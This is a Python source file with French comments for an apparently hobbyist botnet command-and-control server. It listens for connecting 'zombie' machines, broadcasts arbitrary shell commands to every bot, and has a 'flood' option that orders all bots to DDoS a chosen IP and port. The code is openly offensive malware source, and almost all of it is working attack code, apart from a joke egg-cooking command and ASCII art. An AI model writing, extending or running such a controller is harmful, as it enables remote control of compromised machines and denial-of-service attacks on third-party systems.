#coding:utf-8

import socket
import threading
import time

list_hostname = []
z_command = "empty"

#definition du thread
nb_z = 0
class Thread(threading.Thread):
    global z_command
    def __init__(self, conn):
        threading.Thread.__init__(self)
        self.conn = conn
    
    def run(self):
        data = self.conn.recv(1024)
        data = data.decode("utf8")
        if(z_command == "getname"):
            print("\nServer: Zombie name :", data)
        else:
            print("\nServer:", data)
        

#-------------------------------------------------------------------

#c'est assez explicite la
host, port = ('', 4445)

#debut du serv
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((host, port))

print("Server: server on !")
print("Server: you are ", s.getsockname())
print("Waiting for bot...")


#sockname = socket.recv(1024).decode()
list_cmd = ["help", "refresh"]

#etablir la connection
while True:
    def command():
        cmd = input("\n*----------Press Enter :----------*")

        while(cmd != [list_cmd]):
            cmd = input("\nBotnet>")
            
            if(cmd == "help"):
                print("""

                                                                    ,---------,          
                               ,-----------------------,          ,"        ,"|
                             ,"                      ,"|        ,"        ,"  |
                            +-----------------------+  |      ,"        ,"    |
                            |  .-----------------.  |  |     +---------+      |
                            |  |                 |  |  |     | -==----'|      |
                            |  |     WOAZO       |  |  |     |         |      |
                            |  |    HACKING      |  |  |/----|`---=    |      |
                            |  |  C:\>_          |  |  |   ,/|==== ooo |      ;
                            |  |                 |  |  |  // |(((( [33]|    ,"
                            |  `-----------------'  |," .;'| |((((     |  ,"
                            +-----------------------+  ;;  | |         |,"
                                /_)______________(_/  //'   | +---------+
                        ___________________________/___  `,
                        /  oooooooooooooooo  .o.  oooo /,   \,"-----------
                        / ==ooooooooooooooo==.o.  ooo= //   ,`\--{)B     ,"
                        /_==__==========__==_ooo__ooo=_/'   /___________,"
                        `-----------------------------'
                |-- Help: ------------------------------------------------------------------|
                |  help               : Display this help screen                            |
                |  cmd                : Send a command to all bots                          |
                |  refresh            : Refresh request from bots to the server             |
                |  flood              : Execute a DDoS attack with bots you have            |
                |  how to cook an egg : Teach you how to cook an egg                        |
                |  close              : Close all connections with bots and stop the server |
                |---------------------------------------------------------------------------|
                """)
            if(cmd == "refresh"):
                break
            
            if(cmd == "how to cook an egg"):
                print("\nWell, you can cook an egg by putting butter in a pan, and then, break your egg and put it in the pan too (pay attention to pieces of shells)")
            
            if(cmd == "cmd"):
                x = 0
                z_command = input("\nCommand: ")
                #z_command = z_command + tip
                z_command = z_command.encode()
                
                for conn in list_hostname:
                    conn.send(z_command)

            if(cmd == "flood"):
                target_ip = input("\nHelp : \nTarget ip:Target port:Numer of packets (2500 pkts = 10sec) \nExemple : 1.1.1.1:80:2500\n#->> ")
                target_ip = target_ip.encode("utf8")
                flood_signal = (b"Flood " + target_ip)

                for conn in list_hostname:
                    conn.sendall(flood_signal)
                print("Server: The DDoS attack has started")

                
            if(cmd == "close"):
                close_sign = "close"
                close_sign = close_sign.encode()
                conn.send(close_sign)
                conn.close()
                s.close()
    
    s.listen()
    conn, addr = s.accept()
    nb_z = nb_z + 1
    time.sleep(1)
    
    #commencer le thread
    my_thread = Thread(conn)
    my_thread.start()
    
    
    list_hostname.append(conn)
    print(list_hostname)

    print("Server: Zombie connected! (", conn, ")")
    time.sleep(0.5)
    print("Server:", nb_z, "zombie(s) online.")
    command()


